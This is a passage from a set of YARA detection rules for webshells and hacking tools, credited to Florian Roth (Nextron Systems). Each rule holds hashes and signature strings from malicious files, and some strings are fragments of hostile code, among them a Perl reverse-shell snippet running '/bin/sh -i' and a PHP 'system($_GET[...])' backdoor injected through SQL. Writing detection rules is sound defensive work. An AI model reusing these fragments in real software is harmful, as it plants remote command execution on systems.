	condition:
		all of them
}
rule FSO_s_tool {
	meta:
		description = "Webshells Auto-generated - file tool.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3a1e1e889fdd974a130a6a767b42655b"
		id = "ed744aa4-7a35-57d6-89bd-3286a21b50a0"
	strings:
		$s7 = "\"\"%windir%\\\\calc.exe\"\")"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_2005 {
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "97f2552c2fafc0b2eb467ee29cc803c8"
		id = "91d278d5-e9ec-5a28-9a54-4549b4f0cd07"
	strings:
		$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
		$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"
	condition:
		all of them
}
rule byloader {
	meta:
		description = "Webshells Auto-generated - file byloader.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "0f0d6dc26055653f5844ded906ce52df"
		id = "24940e4b-06eb-548d-9e14-1a8f9c864bd3"
	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "NTFS Disk Driver Checking Service"
		$s3 = "Dumping Description to Registry..."
		$s4 = "Opening Service .... Failure !"
	condition:
		all of them
}
rule shelltools_g0t_root_Fport {
	meta:
		description = "Webshells Auto-generated - file Fport.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "dbb75488aa2fa22ba6950aead1ef30d5"
		id = "664e7b19-4d0b-5062-97d2-0eb34869024d"
	strings:
		$s4 = "Copyright 2000 by Foundstone, Inc."
		$s5 = "You must have administrator privileges to run fport - exiting..."
	condition:
		all of them
}
rule BackDooR__fr_ {
	meta:
		description = "Webshells Auto-generated - file BackDooR (fr).php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "a79cac2cf86e073a832aaf29a664f4be"
		id = "fd0c77e8-18b7-5eb4-8ed4-87ee4c864683"
	strings:
		$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "
	condition:
		all of them
}
rule FSO_s_ntdaddy {
	meta:
		description = "Webshells Auto-generated - file ntdaddy.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"
		id = "b6b655b8-7bce-5fa5-97b7-a020a7e53f4f"
	strings:
		$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"
	condition:
		all of them
}
rule nstview_nstview {
	meta:
		description = "Webshells Auto-generated - file nstview.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3871888a0c1ac4270104918231029a56"
		id = "00df601c-bddb-5da8-bef4-d2122419b5d0"
	strings:
		$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"
	condition:
		all of them
}
rule HYTop_DevPack_upload {
	meta:
		description = "Webshells Auto-generated - file upload.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b09852bda534627949f0259828c967de"
		id = "43054993-b0dd-5d2e-9890-db1f47759be5"
	strings:
		$s0 = "<!-- PageUpload Below -->"
	condition:
		all of them
}
rule PasswordReminder {
	meta:
		description = "Webshells Auto-generated - file PasswordReminder.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"
		id = "642033ee-4454-5913-8348-4d1579fc0bd8"
	strings:
		$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."
	condition:
		all of them
}
rule Pack_InjectT {
	meta:
		description = "Webshells Auto-generated - file InjectT.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "983b74ccd57f6195a0584cdfb27d55e8"
		id = "3a640c22-0cd4-5ab1-9216-c68625d7d505"
	strings:
		$s3 = "ail To Open Registry"
		$s4 = "32fDssignim"
		$s5 = "vide Internet S"
		$s6 = "d]Software\\M"
		$s7 = "TInject.Dll"
	condition:
		all of them
}
rule FSO_s_RemExp_2 {
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		id = "501544d5-fe52-5933-8782-516ffe18f3ff"
	strings:
		$s2 = " Then Response.Write \""
		$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"
	condition:
		all of them
}
rule FSO_s_c99 {
	meta:
		description = "Webshells Auto-generated - file c99.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "5f9ba02eb081bba2b2434c603af454d0"
		id = "0b176370-a5ab-587a-b0e9-ef4fe5c604bd"
	strings:
		$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"
	condition:
		all of them
}
rule rknt_zip_Folder_RkNT {
	meta:
		description = "Webshells Auto-generated - file RkNT.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "5f97386dfde148942b7584aeb6512b85"
		id = "a58a3b33-8096-535a-b930-2eb71347edb8"
	strings:
		$s0 = "PathStripPathA"
		$s1 = "`cLGet!Addr%"
		$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s3 = "oQToOemBuff* <="
		$s4 = "ionCdunAsw[Us'"
		$s6 = "CreateProcessW: %S"
		$s7 = "ImageDirectoryEntryToData"
	condition:
		all of them
}
rule dbgntboot {
	meta:
		description = "Webshells Auto-generated - file dbgntboot.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "4d87543d4d7f73c1529c9f8066b475ab"
		id = "6b9381e6-597d-5e74-a318-9931d20a9d08"
	strings:
		$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
		$s3 = "sth junk the M$ Wind0wZ retur"
	condition:
		all of them
}
rule PHP_shell {
	meta:
		description = "Webshells Auto-generated - file shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "45e8a00567f8a34ab1cccc86b4bc74b9"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
	strings:
		$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
		$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"
	condition:
		all of them
}
rule hxdef100 {
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "55cc1769cef44910bd91b7b73dee1f6c"
		id = "fb376c18-02d2-5866-a0e2-ccb5262091dd"
	strings:
		$s0 = "RtlAnsiStringToUnicodeString"
		$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
		$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"
	condition:
		all of them
}
rule rdrbs100 {
	meta:
		description = "Webshells Auto-generated - file rdrbs100.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "7c752bcd6da796d80a6830c61a632bff"
		id = "369e5ce0-984c-54eb-96d4-fbfb4f932ba6"
	strings:
		$s3 = "Server address must be IP in A.B.C.D format."
		$s4 = " mapped ports in the list. Currently "
	condition:
		all of them
}
rule Mithril_Mithril {
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "017191562d72ab0ca551eb89256650bd"
		id = "81645f57-7d7e-5b4d-b323-744f2cde4916"
	strings:
		$s0 = "OpenProcess error!"
		$s1 = "WriteProcessMemory error!"
		$s4 = "GetProcAddress error!"
		$s5 = "HHt`HHt\\"
		$s6 = "Cmaudi0"
		$s7 = "CreateRemoteThread error!"
		$s8 = "Kernel32"
		$s9 = "VirtualAllocEx error!"
	condition:
		all of them
}
rule hxdef100_2 {
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1b393e2e13b9c57fb501b7cd7ad96b25"
		id = "1f079b73-29de-50cf-868c-1639a43e576f"
	strings:
		$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
		$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
		$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
	condition:
		all of them
}
rule Release_dllTest {
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "76a59fc3242a2819307bb9d593bef2e0"
		id = "af821252-8409-5572-9014-59e8c5feaacd"
	strings:
		$s0 = ";;;Y;`;d;h;l;p;t;x;|;"
		$s1 = "0 0&00060K0R0X0f0l0q0w0"
		$s2 = ": :$:(:,:0:4:8:D:`=d="
		$s3 = "4@5P5T5\\5T7\\7d7l7t7|7"
		$s4 = "1,121>1C1K1Q1X1^1e1k1s1y1"
		$s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9"
		$s6 = "0)0O0\\0a0o0\"1E1P1q1"
		$s7 = "<.<I<d<h<l<p<t<x<|<"
		$s8 = "3&31383>3F3Q3X3`3f3w3|3"
		$s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z="
	condition:
		all of them
}
rule webadmin {
	meta:
		description = "Webshells Auto-generated - file webadmin.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3a90de401b30e5b590362ba2dde30937"
		id = "615d87f8-9094-5994-aea1-d7276623fbca"
	strings:
		$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"
	condition:
		all of them
}
rule commands {
	meta:
		description = "Webshells Auto-generated - file commands.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "174486fe844cb388e2ae3494ac2d1ec2"
		id = "7cffefc7-4f24-5908-82a4-f11eda398377"
	strings:
		$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
		$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"
	condition:
		all of them
}
rule hkdoordll {
	meta:
		description = "Webshells Auto-generated - file hkdoordll.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b715c009d47686c0e62d0981efce2552"
		id = "c4cfb575-89c3-5a72-8bf5-234d4284fe9d"
	strings:
		$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"
	condition:
		all of them
}
rule r57shell_2 {
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		id = "d3a3fe11-c9e1-523b-88a3-ddc0c1085d04"
	strings:
		$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"
	condition:
		all of them
}
rule Mithril_v1_45_dllTest {
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1b9e518aaa62b15079ff6edb412b21e9"
		id = "2aea84b6-1b51-58cd-b52b-c31b1f75d295"
	strings:
		$s3 = "syspath"
		$s4 = "\\Mithril"
		$s5 = "--list the services in the computer"
	condition:
		all of them
}
rule dbgiis6cli {
	meta:
		description = "Webshells Auto-generated - file dbgiis6cli.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3044dceb632b636563f66fee3aaaf8f3"
		id = "2bc59a6b-f45c-5e68-a346-ac56e8f2757b"
	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
		$s5 = "###command:(NO more than 100 bytes!)"
	condition:
		all of them
}
rule remview_2003_04_22 {
	meta:
		description = "Webshells Auto-generated - file remview_2003_04_22.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "17d3e4e39fbca857344a7650f7ea55e3"
		id = "3088ee27-42a3-5140-98de-ab6f87c7748b"
	strings:
		$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""
	condition:
		all of them
}
rule FSO_s_test {
	meta:
		description = "Webshells Auto-generated - file test.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "82cf7b48da8286e644f575b039a99c26"
		id = "b0cc5a2a-c741-50dd-854f-5a43769e8f47"
	strings:
		$s0 = "$yazi = \"test\" . \"\\r\\n\";"
		$s2 = "fwrite ($fp, \"$yazi\");"
	condition:
		all of them
}
rule Debug_cress {
	meta:
		description = "Webshells Auto-generated - file cress.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "36a416186fe010574c9be68002a7286a"
		id = "6cf3e43c-bec1-5688-b1d7-8ac48d59153a"
	strings:
		$s0 = "\\Mithril "
		$s4 = "Mithril.exe"
	condition:
		all of them
}
rule webshell {
	meta:
		description = "Webshells Auto-generated - file webshell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "f2f8c02921f29368234bfb4d4622ad19"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "RhViRYOzz"
		$s1 = "d\\O!jWW"
		$s2 = "bc!jWW"
		$s3 = "0W[&{l"
		$s4 = "[INhQ@\\"
	condition:
		all of them
}
rule FSO_s_EFSO_2 {
	meta:
		description = "Webshells Auto-generated - file EFSO_2.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "a341270f9ebd01320a7490c12cb2e64c"
		id = "e88d324c-1dee-5b07-b528-cf760e3ee7a6"
	strings:
		$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
		$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
	condition:
		all of them
}
rule thelast_index3 {
	meta:
		description = "Webshells Auto-generated - file index3.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "cceff6dc247aaa25512bad22120a14b4"
		id = "41310217-b9a7-5360-80c4-7d0a3969f848"
	strings:
		$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"
	condition:
		all of them
}
rule adjustcr {
	meta:
		description = "Webshells Auto-generated - file adjustcr.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "17037fa684ef4c90a25ec5674dac2eb6"
		id = "4b3d9409-60e8-502a-b37b-1e06d57c9b0b"
	strings:
		$s0 = "$Info: This file is packed with the UPX executable packer $"
		$s2 = "$License: NRV for UPX is distributed under special license $"
		$s6 = "AdjustCR Carr"
		$s7 = "ION\\System\\FloatingPo"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_xIShell {
	meta:
		description = "Webshells Auto-generated - file xIShell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "997c8437c0621b4b753a546a53a88674"
		id = "32a32a9a-8d5f-5b3f-8ff4-560555f0ae1e"
	strings:
		$s3 = "if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java"
	condition:
		all of them
}
rule HYTop_AppPack_2005 {
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		id = "67c86d16-a962-5502-8c39-0a6e3dc04031"
	strings:
		$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"
	condition:
		all of them
}
rule xssshell {
	meta:
		description = "Webshells Auto-generated - file xssshell.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"
		id = "ef89653c-5814-525a-b04e-4326a80f780c"
	strings:
		$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_usr {
	meta:
		description = "Webshells Auto-generated - file usr.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "ade3357520325af50c9098dc8a21a024"
		id = "ab1825fe-96aa-5d97-acd6-eac43a12b237"
	strings:
		$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"
	condition:
		all of them
}
rule FSO_s_phpinj {
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		id = "5d84d518-0e18-517f-890b-e296ac265c50"
	strings:
		$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"
	condition:
		all of them
}
rule xssshell_db {
	meta:
		description = "Webshells Auto-generated - file db.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "cb62e2ec40addd4b9930a9e270f5b318"
		id = "94bb2297-95a2-5442-bb16-fb079a29606e"
	strings:
		$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"
	condition:
		all of them
}
rule PHP_sh {
	meta:
		description = "Webshells Auto-generated - file sh.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1e9e879d49eb0634871e9b36f99fe528"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
	strings:
		$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"
	condition:
		all of them
}
rule xssshell_default {
	meta:
		description = "Webshells Auto-generated - file default.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d156782ae5e0b3724de3227b42fcaf2f"
		id = "1c221572-4cb5-5806-a856-0f857dba230a"
	strings:
		$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"
	condition:
		all of them
}
rule EditServer_2 {
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"
		id = "bd254bd9-fd23-5807-9347-2a559089b7c5"
	strings:
		$s0 = "@HOTMAIL.COM"
		$s1 = "Press Any Ke"
		$s3 = "glish MenuZ"
	condition:
		all of them
}
rule by064cli {
	meta:
		description = "Webshells Auto-generated - file by064cli.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "10e0dff366968b770ae929505d2a9885"
		id = "9ea88f0c-9275-5567-a4d9-0545de8044d1"
	strings:
		$s7 = "packet dropped,redirecting"
		$s9 = "input the password(the default one is 'by')"
	condition:
		all of them
}
rule Mithril_dllTest {
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "a8d25d794d8f08cd4de0c3d6bf389e6d"
		id = "59a6bfb6-c099-56cd-b40e-3e92ea0eb7d3"
	strings:
		$s0 = "please enter the password:"
		$s3 = "\\dllTest.pdb"
	condition:
		all of them
}
rule peek_a_boo {
	meta:
		description = "Webshells Auto-generated - file peek-a-boo.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "aca339f60d41fdcba83773be5d646776"
		id = "f6ca33b5-e37f-5124-a193-a3056c559314"
	strings:
		$s0 = "__vbaHresultCheckObj"
		$s1 = "\\VB\\VB5.OLB"
		$s2 = "capGetDriverDescriptionA"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s8 = "__vbaErrorOverflow"
	condition:
		all of them
}
rule fmlibraryv3 {
	meta:
		description = "Webshells Auto-generated - file fmlibraryv3.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "c34c248fed6d5a20d8203924a2088acc"
		id = "9b8ef79d-80bb-5a05-91e6-0f2bc3fd3068"
	strings:
		$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"
	condition:
		all of them
}
rule Debug_dllTest_2 {
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1b9e518aaa62b15079ff6edb412b21e9"
		id = "cf81e3de-513c-584d-bc37-6504e91b170c"
	strings:
		$s4 = "\\Debug\\dllTest.pdb"
		$s5 = "--list the services in the computer"
	condition:
		all of them
}
rule connector {
	meta:
		description = "Webshells Auto-generated - file connector.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3ba1827fca7be37c8296cd60be9dc884"
		id = "e46026bc-c570-5057-a132-5a459c959a69"
	strings:
		$s2 = "If ( AttackID = BROADCAST_ATTACK )"
		$s4 = "Add UNIQUE ID for victims / zombies"
	condition:
		all of them
}
rule shelltools_g0t_root_HideRun {
	meta:
		description = "Webshells Auto-generated - file HideRun.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "45436d9bfd8ff94b71eeaeb280025afe"
		id = "dd71dbef-5b5d-5976-8b95-0f202a4b4795"
	strings:
		$s0 = "Usage -- hiderun [AppName]"
		$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."
	condition:
		all of them
}
rule PHP_Shell_v1_7 {
	meta:
		description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b5978501c7112584532b4ca6fb77cba5"
		id = "7eb69ac3-90bb-5a44-8dcd-e71f5edcf18f"
	strings:
		$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"
	condition:
		all of them
}
rule xssshell_save {
	meta:
		description = "Webshells Auto-generated - file save.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "865da1b3974e940936fe38e8e1964980"
		id = "f33c7559-e2f7-5223-a0e9-4e1d3bc7f080"
	strings:
		$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
		$s5 = "VictimID = fm_NStr(Victims(i))"
	condition:
		all of them
}
rule screencap {
	meta:
		description = "Webshells Auto-generated - file screencap.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "51139091dea7a9418a50f2712ea72aa6"
		id = "0c1b71d3-ad54-5230-b1ab-971647e76139"
	strings:
		$s0 = "GetDIBColorTable"
		$s1 = "Screen.bmp"
		$s2 = "CreateDCA"
	condition:
		all of them
}
rule FSO_s_phpinj_2 {
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		id = "db8f835e-eb13-50f3-a60b-7d8ffcaa5eaa"
	strings:
		$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"
	condition:
		all of them
}
rule ZXshell2_0_rar_Folder_zxrecv {
	meta:
		description = "Webshells Auto-generated - file zxrecv.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "5d3d12a39f41d51341ef4cb7ce69d30f"
		id = "9d36541f-dd55-5385-8e2b-598ad78bdf73"
	strings:
		$s0 = "RyFlushBuff"
		$s1 = "teToWideChar^FiYP"
		$s2 = "mdesc+8F D"
		$s3 = "\\von76std"
		$s4 = "5pur+virtul"
		$s5 = "- Kablto io"
		$s6 = "ac#f{lowi8a"
	condition:
		all of them
}
rule FSO_s_ajan {
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		id = "03bf98b9-c8c5-5b9f-b0cd-700c5ed58eac"
	strings:
		$s4 = "entrika.write \"BinaryStream.SaveToFile"
	condition:
		all of them
}
rule c99shell {
	meta:
		description = "Webshells Auto-generated - file c99shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "90b86a9c63e2cd346fe07cea23fbfc56"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"
	condition:
		all of them
}
rule phpspy_2005_full {
	meta:
		description = "Webshells Auto-generated - file phpspy_2005_full.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d1c69bb152645438440e6c903bac16b2"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
	strings:
		$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"
	condition:
		all of them
}
rule FSO_s_zehir4_2 {
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "5b496a61363d304532bcf52ee21f5d55"
